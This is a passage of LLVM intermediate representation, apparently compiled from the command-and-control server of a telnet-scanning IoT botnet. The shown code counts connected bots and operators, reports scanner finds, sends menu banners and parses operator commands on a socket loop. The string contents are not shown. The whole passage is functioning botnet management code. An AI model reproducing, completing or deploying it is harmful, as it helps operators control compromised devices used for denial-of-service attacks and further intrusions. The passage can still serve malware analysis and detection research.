  %172 = icmp eq i64 %171, -1
  br i1 %172, label %173, label %174

173:                                              ; preds = %164
  br label %776

174:                                              ; preds = %164
  %175 = call i32 @sleep(i32 5)
  br label %776

176:                                              ; preds = %156
  %177 = load i8*, i8** %3, align 8
  %178 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %177) #9
  %179 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %179, i8 0, i64 2048, i1 false)
  %180 = getelementptr inbounds [50 x i8], [50 x i8]* %28, i64 0, i64 0
  %181 = call i32 (i8*, i8*, ...) @sprintf(i8* %180, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.26, i64 0, i64 0)) #9
  %182 = getelementptr inbounds [50 x i8], [50 x i8]* %29, i64 0, i64 0
  %183 = call i32 (i8*, i8*, ...) @sprintf(i8* %182, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.27, i64 0, i64 0)) #9
  %184 = getelementptr inbounds [50 x i8], [50 x i8]* %30, i64 0, i64 0
  %185 = call i32 (i8*, i8*, ...) @sprintf(i8* %184, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.28, i64 0, i64 0)) #9
  %186 = getelementptr inbounds [50 x i8], [50 x i8]* %31, i64 0, i64 0
  %187 = call i32 (i8*, i8*, ...) @sprintf(i8* %186, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.29, i64 0, i64 0)) #9
  %188 = getelementptr inbounds [50 x i8], [50 x i8]* %32, i64 0, i64 0
  %189 = call i32 (i8*, i8*, ...) @sprintf(i8* %188, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.30, i64 0, i64 0)) #9
  %190 = getelementptr inbounds [50 x i8], [50 x i8]* %33, i64 0, i64 0
  %191 = call i32 (i8*, i8*, ...) @sprintf(i8* %190, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.31, i64 0, i64 0)) #9
  %192 = getelementptr inbounds [50 x i8], [50 x i8]* %34, i64 0, i64 0
  %193 = call i32 (i8*, i8*, ...) @sprintf(i8* %192, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.32, i64 0, i64 0)) #9
  %194 = getelementptr inbounds [50 x i8], [50 x i8]* %35, i64 0, i64 0
  %195 = call i32 (i8*, i8*, ...) @sprintf(i8* %194, i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.33, i64 0, i64 0)) #9
  %196 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %197 = call i32 (i8*, i8*, ...) @sprintf(i8* %196, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.34, i64 0, i64 0)) #9
  %198 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %199 = call i32 (i8*, i8*, ...) @sprintf(i8* %198, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.35, i64 0, i64 0)) #9
  %200 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %201 = call i32 @BotsConnected()
  %202 = load volatile i32, i32* @OperatorsConnected, align 4
  %203 = call i32 (i8*, i8*, ...) @sprintf(i8* %200, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.36, i64 0, i64 0), i32 %201, i32 %202) #9
  %204 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %205 = load i32, i32* %5, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds [2 x %struct.login_info], [2 x %struct.login_info]* @accounts, i64 0, i64 %206
  %208 = getelementptr inbounds %struct.login_info, %struct.login_info* %207, i32 0, i32 0
  %209 = getelementptr inbounds [20 x i8], [20 x i8]* %208, i64 0, i64 0
  %210 = call i32 (i8*, i8*, ...) @sprintf(i8* %204, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.37, i64 0, i64 0), i8* %209) #9
  %211 = load i32, i32* %4, align 4
  %212 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %213 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %214 = call i64 @strlen(i8* %213) #8
  %215 = call i64 @send(i32 %211, i8* %212, i64 %214, i32 16384)
  %216 = icmp eq i64 %215, -1
  br i1 %216, label %217, label %218

217:                                              ; preds = %176
  br label %776

218:                                              ; preds = %176
  %219 = load i32, i32* %4, align 4
  %220 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %221 = getelementptr inbounds [5000 x i8], [5000 x i8]* %17, i64 0, i64 0
  %222 = call i64 @strlen(i8* %221) #8
  %223 = call i64 @send(i32 %219, i8* %220, i64 %222, i32 16384)
  %224 = icmp eq i64 %223, -1
  br i1 %224, label %225, label %226

225:                                              ; preds = %218
  br label %776

226:                                              ; preds = %218
  %227 = load i32, i32* %4, align 4
  %228 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %229 = getelementptr inbounds [5000 x i8], [5000 x i8]* %18, i64 0, i64 0
  %230 = call i64 @strlen(i8* %229) #8
  %231 = call i64 @send(i32 %227, i8* %228, i64 %230, i32 16384)
  %232 = icmp eq i64 %231, -1
  br i1 %232, label %233, label %234

233:                                              ; preds = %226
  br label %776

234:                                              ; preds = %226
  %235 = load i32, i32* %4, align 4
  %236 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %237 = getelementptr inbounds [5000 x i8], [5000 x i8]* %19, i64 0, i64 0
  %238 = call i64 @strlen(i8* %237) #8
  %239 = call i64 @send(i32 %235, i8* %236, i64 %238, i32 16384)
  %240 = icmp eq i64 %239, -1
  br i1 %240, label %241, label %242

241:                                              ; preds = %234
  br label %776

242:                                              ; preds = %234
  %243 = load i32, i32* %4, align 4
  %244 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %245 = getelementptr inbounds [5000 x i8], [5000 x i8]* %20, i64 0, i64 0
  %246 = call i64 @strlen(i8* %245) #8
  %247 = call i64 @send(i32 %243, i8* %244, i64 %246, i32 16384)
  %248 = icmp eq i64 %247, -1
  br i1 %248, label %249, label %250

249:                                              ; preds = %242
  br label %776

250:                                              ; preds = %242
  %251 = load i32, i32* %4, align 4
  %252 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %253 = getelementptr inbounds [5000 x i8], [5000 x i8]* %21, i64 0, i64 0
  %254 = call i64 @strlen(i8* %253) #8
  %255 = call i64 @send(i32 %251, i8* %252, i64 %254, i32 16384)
  %256 = icmp eq i64 %255, -1
  br i1 %256, label %257, label %258

257:                                              ; preds = %250
  br label %776

258:                                              ; preds = %250
  %259 = load i32, i32* %4, align 4
  %260 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %261 = getelementptr inbounds [5000 x i8], [5000 x i8]* %22, i64 0, i64 0
  %262 = call i64 @strlen(i8* %261) #8
  %263 = call i64 @send(i32 %259, i8* %260, i64 %262, i32 16384)
  %264 = icmp eq i64 %263, -1
  br i1 %264, label %265, label %266

265:                                              ; preds = %258
  br label %776

266:                                              ; preds = %258
  %267 = load i32, i32* %4, align 4
  %268 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %269 = getelementptr inbounds [5000 x i8], [5000 x i8]* %23, i64 0, i64 0
  %270 = call i64 @strlen(i8* %269) #8
  %271 = call i64 @send(i32 %267, i8* %268, i64 %270, i32 16384)
  %272 = icmp eq i64 %271, -1
  br i1 %272, label %273, label %274

273:                                              ; preds = %266
  br label %776

274:                                              ; preds = %266
  %275 = load i32, i32* %4, align 4
  %276 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %277 = getelementptr inbounds [5000 x i8], [5000 x i8]* %24, i64 0, i64 0
  %278 = call i64 @strlen(i8* %277) #8
  %279 = call i64 @send(i32 %275, i8* %276, i64 %278, i32 16384)
  %280 = icmp eq i64 %279, -1
  br i1 %280, label %281, label %282

281:                                              ; preds = %274
  br label %776

282:                                              ; preds = %274
  %283 = load i32, i32* %4, align 4
  %284 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %285 = getelementptr inbounds [5000 x i8], [5000 x i8]* %25, i64 0, i64 0
  %286 = call i64 @strlen(i8* %285) #8
  %287 = call i64 @send(i32 %283, i8* %284, i64 %286, i32 16384)
  %288 = icmp eq i64 %287, -1
  br i1 %288, label %289, label %290

289:                                              ; preds = %282
  br label %776

290:                                              ; preds = %282
  %291 = load i32, i32* %4, align 4
  %292 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %293 = getelementptr inbounds [80 x i8], [80 x i8]* %26, i64 0, i64 0
  %294 = call i64 @strlen(i8* %293) #8
  %295 = call i64 @send(i32 %291, i8* %292, i64 %294, i32 16384)
  %296 = icmp eq i64 %295, -1
  br i1 %296, label %297, label %298

297:                                              ; preds = %290
  br label %776

298:                                              ; preds = %290
  br label %299

299:                                              ; preds = %298
  %300 = load i32, i32* %4, align 4
  %301 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %302 = getelementptr inbounds [2048 x i8], [2048 x i8]* %27, i64 0, i64 0
  %303 = call i64 @strlen(i8* %302) #8
  %304 = call i64 @send(i32 %300, i8* %301, i64 %303, i32 16384)
  %305 = icmp eq i64 %304, -1
  br i1 %305, label %306, label %307

306:                                              ; preds = %299
  br label %776

307:                                              ; preds = %299
  %308 = load i32, i32* %4, align 4
  %309 = call i64 @send(i32 %308, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.38, i64 0, i64 0), i64 12, i32 16384)
  %310 = icmp eq i64 %309, -1
  br i1 %310, label %311, label %312

311:                                              ; preds = %307
  br label %776

312:                                              ; preds = %307
  br label %313

313:                                              ; preds = %312
  %314 = load i8*, i8** %3, align 8
  %315 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %314) #9
  %316 = load i32, i32* %4, align 4
  %317 = sext i32 %316 to i64
  %318 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %317
  %319 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %318, i32 0, i32 0
  store i32 1, i32* %319, align 4
  br label %320

320:                                              ; preds = %742, %741, %708, %684, %589, %568, %504, %370, %347, %313
  %321 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %322 = load i32, i32* %4, align 4
  %323 = call i32 @fdgets(i8* %321, i32 2048, i32 %322)
  %324 = icmp sgt i32 %323, 0
  br i1 %324, label %325, label %775

325:                                              ; preds = %320
  %326 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %327 = call i8* @strstr(i8* %326, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i64 0, i64 0)) #8
  %328 = icmp ne i8* %327, null
  br i1 %328, label %329, label %348

329:                                              ; preds = %325
  %330 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %330, i8 0, i64 2048, i1 false)
  %331 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i64 0, i64 0
  %332 = call i32 @BotsConnected()
  %333 = load volatile i32, i32* @OperatorsConnected, align 4
  %334 = call i32 (i8*, i8*, ...) @sprintf(i8* %331, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.40, i64 0, i64 0), i32 %332, i32 %333) #9
  %335 = load i32, i32* %4, align 4
  %336 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i64 0, i64 0
  %337 = getelementptr inbounds [2048 x i8], [2048 x i8]* %36, i64 0, i64 0
  %338 = call i64 @strlen(i8* %337) #8
  %339 = call i64 @send(i32 %335, i8* %336, i64 %338, i32 16384)
  %340 = icmp eq i64 %339, -1
  br i1 %340, label %341, label %342

341:                                              ; preds = %329
  store i8* null, i8** %2, align 8
  br label %785

342:                                              ; preds = %329
  %343 = load i32, i32* %4, align 4
  %344 = call i64 @send(i32 %343, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.38, i64 0, i64 0), i64 12, i32 16384)
  %345 = icmp eq i64 %344, -1
  br i1 %345, label %346, label %347

346:                                              ; preds = %342
  br label %776

347:                                              ; preds = %342
  br label %320, !llvm.loop !19

348:                                              ; preds = %325
  %349 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %350 = call i8* @strstr(i8* %349, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.41, i64 0, i64 0)) #8
  %351 = icmp ne i8* %350, null
  br i1 %351, label %352, label %371

352:                                              ; preds = %348
  %353 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %353, i8 0, i64 2048, i1 false)
  %354 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  %355 = load volatile i32, i32* @TELFound, align 4
  %356 = load volatile i32, i32* @scannerreport, align 4
  %357 = call i32 (i8*, i8*, ...) @sprintf(i8* %354, i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.42, i64 0, i64 0), i32 %355, i32 %356) #9
  %358 = load i32, i32* %4, align 4
  %359 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  %360 = getelementptr inbounds [2048 x i8], [2048 x i8]* %37, i64 0, i64 0
  %361 = call i64 @strlen(i8* %360) #8
  %362 = call i64 @send(i32 %358, i8* %359, i64 %361, i32 16384)
  %363 = icmp eq i64 %362, -1
  br i1 %363, label %364, label %365

364:                                              ; preds = %352
  store i8* null, i8** %2, align 8
  br label %785

365:                                              ; preds = %352
  %366 = load i32, i32* %4, align 4
  %367 = call i64 @send(i32 %366, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.38, i64 0, i64 0), i64 12, i32 16384)
  %368 = icmp eq i64 %367, -1
  br i1 %368, label %369, label %370

369:                                              ; preds = %365
  br label %776

370:                                              ; preds = %365
  br label %320, !llvm.loop !19

371:                                              ; preds = %348
  %372 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %373 = call i8* @strstr(i8* %372, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.43, i64 0, i64 0)) #8
  %374 = icmp ne i8* %373, null
  br i1 %374, label %375, label %505

375:                                              ; preds = %371
  %376 = load i8*, i8** %3, align 8
  %377 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %376) #9
  %378 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %379 = call i32 (i8*, i8*, ...) @sprintf(i8* %378, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.44, i64 0, i64 0)) #9
  %380 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %381 = call i32 (i8*, i8*, ...) @sprintf(i8* %380, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.45, i64 0, i64 0)) #9
  %382 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %383 = call i32 (i8*, i8*, ...) @sprintf(i8* %382, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.46, i64 0, i64 0)) #9
  %384 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i64 0, i64 0
  %385 = call i32 (i8*, i8*, ...) @sprintf(i8* %384, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.47, i64 0, i64 0)) #9
  %386 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %387 = call i32 (i8*, i8*, ...) @sprintf(i8* %386, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.48, i64 0, i64 0)) #9
  %388 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %389 = call i32 (i8*, i8*, ...) @sprintf(i8* %388, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.49, i64 0, i64 0)) #9
  %390 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i64 0, i64 0
  %391 = call i32 (i8*, i8*, ...) @sprintf(i8* %390, i8* getelementptr inbounds ([37 x i8], [37 x i8]* @.str.50, i64 0, i64 0)) #9
  %392 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %393 = call i32 (i8*, i8*, ...) @sprintf(i8* %392, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.51, i64 0, i64 0)) #9
  %394 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %395 = call i32 (i8*, i8*, ...) @sprintf(i8* %394, i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.52, i64 0, i64 0)) #9
  %396 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %397 = call i32 (i8*, i8*, ...) @sprintf(i8* %396, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.53, i64 0, i64 0)) #9
  %398 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i64 0, i64 0
  %399 = call i32 (i8*, i8*, ...) @sprintf(i8* %398, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.54, i64 0, i64 0)) #9
  %400 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %401 = call i32 (i8*, i8*, ...) @sprintf(i8* %400, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i64 0, i64 0)) #9
  %402 = load i32, i32* %4, align 4
  %403 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %404 = getelementptr inbounds [80 x i8], [80 x i8]* %38, i64 0, i64 0
  %405 = call i64 @strlen(i8* %404) #8
  %406 = call i64 @send(i32 %402, i8* %403, i64 %405, i32 16384)
  %407 = icmp eq i64 %406, -1
  br i1 %407, label %408, label %409

408:                                              ; preds = %375
  br label %776

409:                                              ; preds = %375
  %410 = load i32, i32* %4, align 4
  %411 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %412 = getelementptr inbounds [80 x i8], [80 x i8]* %39, i64 0, i64 0
  %413 = call i64 @strlen(i8* %412) #8
  %414 = call i64 @send(i32 %410, i8* %411, i64 %413, i32 16384)
  %415 = icmp eq i64 %414, -1
  br i1 %415, label %416, label %417

416:                                              ; preds = %409
  br label %776

417:                                              ; preds = %409
  %418 = load i32, i32* %4, align 4
  %419 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %420 = getelementptr inbounds [80 x i8], [80 x i8]* %40, i64 0, i64 0
  %421 = call i64 @strlen(i8* %420) #8
  %422 = call i64 @send(i32 %418, i8* %419, i64 %421, i32 16384)
  %423 = icmp eq i64 %422, -1
  br i1 %423, label %424, label %425

424:                                              ; preds = %417
  br label %776

425:                                              ; preds = %417
  %426 = load i32, i32* %4, align 4
  %427 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i64 0, i64 0
  %428 = getelementptr inbounds [80 x i8], [80 x i8]* %41, i64 0, i64 0
  %429 = call i64 @strlen(i8* %428) #8
  %430 = call i64 @send(i32 %426, i8* %427, i64 %429, i32 16384)
  %431 = icmp eq i64 %430, -1
  br i1 %431, label %432, label %433

432:                                              ; preds = %425
  br label %776

433:                                              ; preds = %425
  %434 = load i32, i32* %4, align 4
  %435 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %436 = getelementptr inbounds [80 x i8], [80 x i8]* %42, i64 0, i64 0
  %437 = call i64 @strlen(i8* %436) #8
  %438 = call i64 @send(i32 %434, i8* %435, i64 %437, i32 16384)
  %439 = icmp eq i64 %438, -1
  br i1 %439, label %440, label %441

440:                                              ; preds = %433
  br label %776

441:                                              ; preds = %433
  %442 = load i32, i32* %4, align 4
  %443 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %444 = getelementptr inbounds [80 x i8], [80 x i8]* %43, i64 0, i64 0
  %445 = call i64 @strlen(i8* %444) #8
  %446 = call i64 @send(i32 %442, i8* %443, i64 %445, i32 16384)
  %447 = icmp eq i64 %446, -1
  br i1 %447, label %448, label %449

448:                                              ; preds = %441
  br label %776

449:                                              ; preds = %441
  %450 = load i32, i32* %4, align 4
  %451 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i64 0, i64 0
  %452 = getelementptr inbounds [80 x i8], [80 x i8]* %44, i64 0, i64 0
  %453 = call i64 @strlen(i8* %452) #8
  %454 = call i64 @send(i32 %450, i8* %451, i64 %453, i32 16384)
  %455 = icmp eq i64 %454, -1
  br i1 %455, label %456, label %457

456:                                              ; preds = %449
  br label %776

457:                                              ; preds = %449
  %458 = load i32, i32* %4, align 4
  %459 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %460 = getelementptr inbounds [80 x i8], [80 x i8]* %45, i64 0, i64 0
  %461 = call i64 @strlen(i8* %460) #8
  %462 = call i64 @send(i32 %458, i8* %459, i64 %461, i32 16384)
  %463 = icmp eq i64 %462, -1
  br i1 %463, label %464, label %465

464:                                              ; preds = %457
  br label %776

465:                                              ; preds = %457
  %466 = load i32, i32* %4, align 4
  %467 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %468 = getelementptr inbounds [80 x i8], [80 x i8]* %46, i64 0, i64 0
  %469 = call i64 @strlen(i8* %468) #8
  %470 = call i64 @send(i32 %466, i8* %467, i64 %469, i32 16384)
  %471 = icmp eq i64 %470, -1
  br i1 %471, label %472, label %473

472:                                              ; preds = %465
  br label %776

473:                                              ; preds = %465
  %474 = load i32, i32* %4, align 4
  %475 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %476 = getelementptr inbounds [80 x i8], [80 x i8]* %47, i64 0, i64 0
  %477 = call i64 @strlen(i8* %476) #8
  %478 = call i64 @send(i32 %474, i8* %475, i64 %477, i32 16384)
  %479 = icmp eq i64 %478, -1
  br i1 %479, label %480, label %481

480:                                              ; preds = %473
  br label %776

481:                                              ; preds = %473
  %482 = load i32, i32* %4, align 4
  %483 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i64 0, i64 0
  %484 = getelementptr inbounds [80 x i8], [80 x i8]* %48, i64 0, i64 0
  %485 = call i64 @strlen(i8* %484) #8
  %486 = call i64 @send(i32 %482, i8* %483, i64 %485, i32 16384)
  %487 = icmp eq i64 %486, -1
  br i1 %487, label %488, label %489

488:                                              ; preds = %481
  br label %776

489:                                              ; preds = %481
  %490 = load i32, i32* %4, align 4
  %491 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %492 = getelementptr inbounds [80 x i8], [80 x i8]* %49, i64 0, i64 0
  %493 = call i64 @strlen(i8* %492) #8
  %494 = call i64 @send(i32 %490, i8* %491, i64 %493, i32 16384)
  %495 = icmp eq i64 %494, -1
  br i1 %495, label %496, label %497

496:                                              ; preds = %489
  br label %776

497:                                              ; preds = %489
  %498 = load i8*, i8** %3, align 8
  %499 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %498) #9
  %500 = load i32, i32* %4, align 4
  %501 = call i64 @send(i32 %500, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.38, i64 0, i64 0), i64 12, i32 16384)
  %502 = icmp eq i64 %501, -1
  br i1 %502, label %503, label %504

503:                                              ; preds = %497
  br label %776

504:                                              ; preds = %497
  br label %320, !llvm.loop !19

505:                                              ; preds = %371
  %506 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %507 = call i8* @strstr(i8* %506, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.56, i64 0, i64 0)) #8
  %508 = icmp ne i8* %507, null
  br i1 %508, label %509, label %569

509:                                              ; preds = %505
  %510 = load i8*, i8** %3, align 8
  %511 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %510) #9
  %512 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %513 = call i32 (i8*, i8*, ...) @sprintf(i8* %512, i8* getelementptr inbounds ([42 x i8], [42 x i8]* @.str.57, i64 0, i64 0)) #9
  %514 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %515 = call i32 (i8*, i8*, ...) @sprintf(i8* %514, i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.45, i64 0, i64 0)) #9
  %516 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i64 0, i64 0
  %517 = call i32 (i8*, i8*, ...) @sprintf(i8* %516, i8* getelementptr inbounds ([59 x i8], [59 x i8]* @.str.46, i64 0, i64 0)) #9
  %518 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i64 0, i64 0
  %519 = call i32 (i8*, i8*, ...) @sprintf(i8* %518, i8* getelementptr inbounds ([41 x i8], [41 x i8]* @.str.47, i64 0, i64 0)) #9
  %520 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i64 0, i64 0
  %521 = call i32 (i8*, i8*, ...) @sprintf(i8* %520, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.48, i64 0, i64 0)) #9
  %522 = load i32, i32* %4, align 4
  %523 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %524 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %525 = call i64 @strlen(i8* %524) #8
  %526 = call i64 @send(i32 %522, i8* %523, i64 %525, i32 16384)
  %527 = icmp eq i64 %526, -1
  br i1 %527, label %528, label %529

528:                                              ; preds = %509
  br label %776

529:                                              ; preds = %509
  %530 = load i32, i32* %4, align 4
  %531 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %532 = getelementptr inbounds [80 x i8], [80 x i8]* %51, i64 0, i64 0
  %533 = call i64 @strlen(i8* %532) #8
  %534 = call i64 @send(i32 %530, i8* %531, i64 %533, i32 16384)
  %535 = icmp eq i64 %534, -1
  br i1 %535, label %536, label %537

536:                                              ; preds = %529
  br label %776

537:                                              ; preds = %529
  %538 = load i32, i32* %4, align 4
  %539 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i64 0, i64 0
  %540 = getelementptr inbounds [80 x i8], [80 x i8]* %52, i64 0, i64 0
  %541 = call i64 @strlen(i8* %540) #8
  %542 = call i64 @send(i32 %538, i8* %539, i64 %541, i32 16384)
  %543 = icmp eq i64 %542, -1
  br i1 %543, label %544, label %545

544:                                              ; preds = %537
  br label %776

545:                                              ; preds = %537
  %546 = load i32, i32* %4, align 4
  %547 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i64 0, i64 0
  %548 = getelementptr inbounds [80 x i8], [80 x i8]* %53, i64 0, i64 0
  %549 = call i64 @strlen(i8* %548) #8
  %550 = call i64 @send(i32 %546, i8* %547, i64 %549, i32 16384)
  %551 = icmp eq i64 %550, -1
  br i1 %551, label %552, label %553

552:                                              ; preds = %545
  br label %776

553:                                              ; preds = %545
  %554 = load i32, i32* %4, align 4
  %555 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i64 0, i64 0
  %556 = getelementptr inbounds [80 x i8], [80 x i8]* %54, i64 0, i64 0
  %557 = call i64 @strlen(i8* %556) #8
  %558 = call i64 @send(i32 %554, i8* %555, i64 %557, i32 16384)
  %559 = icmp eq i64 %558, -1
  br i1 %559, label %560, label %561

560:                                              ; preds = %553
  br label %776

561:                                              ; preds = %553
  %562 = load i8*, i8** %3, align 8
  %563 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @TitleWriter, i8* %562) #9
  %564 = load i32, i32* %4, align 4
  %565 = call i64 @send(i32 %564, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.38, i64 0, i64 0), i64 12, i32 16384)
  %566 = icmp eq i64 %565, -1
  br i1 %566, label %567, label %568

567:                                              ; preds = %561
  br label %776

568:                                              ; preds = %561
  br label %320, !llvm.loop !19

569:                                              ; preds = %505
  %570 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %571 = call i8* @strstr(i8* %570, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.58, i64 0, i64 0)) #8
  %572 = icmp ne i8* %571, null
  br i1 %572, label %573, label %590

573:                                              ; preds = %569
  %574 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %574, i8 0, i64 2048, i1 false)
  %575 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %576 = call i32 (i8*, i8*, ...) @sprintf(i8* %575, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i64 0, i64 0)) #9
  %577 = load i32, i32* %4, align 4
  %578 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %579 = getelementptr inbounds [2048 x i8], [2048 x i8]* %55, i64 0, i64 0
  %580 = call i64 @strlen(i8* %579) #8
  %581 = call i64 @send(i32 %577, i8* %578, i64 %580, i32 16384)
  %582 = icmp eq i64 %581, -1
  br i1 %582, label %583, label %584

583:                                              ; preds = %573
  br label %776

584:                                              ; preds = %573
  %585 = load i32, i32* %4, align 4
  %586 = call i64 @send(i32 %585, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.38, i64 0, i64 0), i64 12, i32 16384)
  %587 = icmp eq i64 %586, -1
  br i1 %587, label %588, label %589

588:                                              ; preds = %584
  br label %776

589:                                              ; preds = %584
